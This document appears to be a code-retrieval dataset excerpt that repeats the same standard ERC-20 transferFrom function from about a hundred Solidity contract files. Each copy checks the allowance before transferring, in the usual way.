<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="89" endline="98" pcid="7071">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="87" endline="96" pcid="4020">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="88" endline="97" pcid="8218">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="87" endline="96" pcid="179">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="87" endline="96" pcid="5579">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="86" endline="95" pcid="6944">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="84" endline="93" pcid="900">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="86" endline="95" pcid="2069">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="89" endline="98" pcid="1389">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="89" endline="98" pcid="7978">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="87" endline="96" pcid="8428">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="85" endline="94" pcid="6123">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="88" endline="97" pcid="4972">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="89" endline="98" pcid="6218">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="86" endline="95" pcid="6383">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="85" endline="94" pcid="1968">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="85" endline="94" pcid="100">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="82" endline="91" pcid="6188">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="89" endline="98" pcid="4229">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="89" endline="98" pcid="334">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="88" endline="97" pcid="5648">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="85" endline="94" pcid="9181">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="85" endline="94" pcid="6024">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="90" endline="99" pcid="452">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="89" endline="98" pcid="4214">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="86" endline="95" pcid="7793">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="86" endline="95" pcid="537">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="88" endline="97" pcid="6054">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="90" endline="99" pcid="8711">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="85" endline="94" pcid="7823">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="88" endline="97" pcid="8885">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="89" endline="98" pcid="6959">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="90" endline="99" pcid="6505">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="91" endline="100" pcid="2203">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="89" endline="98" pcid="6570">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="85" endline="94" pcid="4846">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="86" endline="95" pcid="296">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="89" endline="98" pcid="1449">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="82" endline="91" pcid="1630">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="705" endline="714" pcid="4096">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="84" endline="93" pcid="7747">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="82" endline="91" pcid="6914">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="89" endline="98" pcid="1585">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="89" endline="98" pcid="7595">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="69" endline="78" pcid="790">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="86" endline="95" pcid="5534">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="190" endline="199" pcid="7087">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="89" endline="98" pcid="1493">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="82" endline="91" pcid="8855">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="85" endline="94" pcid="5868">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="87" endline="96" pcid="4731">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="89" endline="98" pcid="5150">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="89" endline="98" pcid="349">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="89" endline="98" pcid="7521">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="88" endline="97" pcid="8801">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="89" endline="98" pcid="1248">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="88" endline="97" pcid="777">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="84" endline="93" pcid="7993">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="88" endline="97" pcid="7476">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="83" endline="92" pcid="7220">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="89" endline="98" pcid="1888">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="88" endline="97" pcid="5787">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="86" endline="95" pcid="144">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="90" endline="99" pcid="5980">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="87" endline="96" pcid="8278">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="88" endline="97" pcid="5944">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="91" endline="100" pcid="7345">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="86" endline="95" pcid="4391">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="81" endline="90" pcid="5595">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="85" endline="94" pcid="8816">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="84" endline="93" pcid="6353">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="89" endline="98" pcid="1115">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="86" endline="95" pcid="8233">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="88" endline="97" pcid="129">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="89" endline="98" pcid="8675">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="85" endline="94" pcid="8368">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="89" endline="98" pcid="4936">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="89" endline="98" pcid="5549">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="86" endline="95" pcid="7702">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="90" endline="99" pcid="734">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="86" endline="95" pcid="5175">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="89" endline="98" pcid="6974">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="87" endline="96" pcid="9163">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="85" endline="94" pcid="4831">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="86" endline="95" pcid="6814">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="86" endline="95" pcid="8838">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="86" endline="95" pcid="8338">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="85" endline="94" pcid="930">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="83" endline="92" pcid="5036">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="85" endline="94" pcid="5502">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="89" endline="98" pcid="4406">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="90" endline="99" pcid="994">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="85" endline="94" pcid="8323">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
